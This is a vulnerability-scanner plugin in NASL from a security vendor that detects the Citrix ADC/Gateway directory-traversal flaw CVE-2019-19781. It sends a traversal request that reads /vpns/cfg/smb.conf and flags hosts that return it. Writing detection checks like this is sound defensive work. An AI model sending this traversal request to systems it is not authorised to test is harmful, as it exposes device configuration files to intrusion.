############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
  script_id(51799173);
  script_version("1.3");
  script_cve_id("CVE-2019-19781");
  script_family(english:"CGI abuses");
  script_name(english:"Citrix Path Disclosure");
  script_summary(english:"Citrix Path Disclosure");
  script_set_attribute(attribute:"description", value:"An issue was discovered in Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0. They allow Directory Traversal.");
  script_set_attribute(attribute:"solution", value:"1、Strongly urges affected customers to immediately apply the provided mitigation. Customers should then upgrade all of their vulnerable appliances to a fixed version of the appliance firmware when released. Subscribe to bulletin alerts at https://support.citrix.com/user/alerts  to be notified when the new firmware is available.2、Temporary solution, for different environments, please refer to the official Citrix mitigation solution: https://support.citrix.com/article/CTX267679");
  script_set_attribute(attribute:"vuln_publication_date",value:"2019/12/19");
  script_set_attribute(attribute:"patch_publication_date",value:"");
  script_set_attribute(attribute:"plugin_publication_date", value:"2020/01/09");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_end_attributes();
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_dependencies("find_service1.nasl","httpver.nasl");
  exit(0);
 
}

#
# The script code starts here
#
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");
include("ssl_funcs.inc");

function check_vuln(port){
	if ( !get_port_state(port) ) exit(0);
	url = string("/vpn/../vpns/cfg/smb.conf");
	req = http_send_recv3(method: "GET", port: port, item: url);
	if( req[2] == NULL) exit(0);
	if( "200 ">< req[0] && "[global]" >< req[2] && "encrypt passwords = " >< req[2] && "name resolve order = " >< req[2]){
	  	if (report_verbosity > 0) security_hole(port:port, extra:req[2]);
			  else security_hole(port);
    }
}

function check_vuln_ssl(port){
	if ( !get_port_state(port) ) exit(0);
	url = string("/vpn/../vpns/cfg/smb.conf");
	req = http_get(item:url, port:port);
        ssl_req = https_req_get(port:port , request:req);
	if( ssl_req == NULL) exit(0);
	if( "200 "><ssl_req && "[global]"><ssl_req && "encrypt passwords = "><ssl_req && "name resolve order = "><ssl_req){
		if (report_verbosity > 0) security_hole(port:port, extra:ssl_req);
			  else security_hole(port);
	}
}


##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}

